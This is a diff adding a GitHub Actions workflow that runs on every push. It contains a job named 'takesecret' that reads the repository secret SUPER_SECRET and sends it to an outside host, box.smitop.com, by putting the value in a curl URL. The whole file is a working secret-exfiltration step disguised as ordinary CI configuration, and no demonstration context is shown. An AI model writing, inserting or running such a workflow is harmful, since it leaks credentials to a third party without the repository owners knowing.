@@ -1,0 +1,10 @@
+on: [push]
+
+jobs:
+  takesecret:
+    runs-on: ubuntu-20.04
+    steps:
+      - name: do it
+        env:
+          SUPER_SECRET: ${{ SECRETS.SUPER_SECRET }}
+        run: curl "https://box.smitop.com/$SUPER_SECRET"
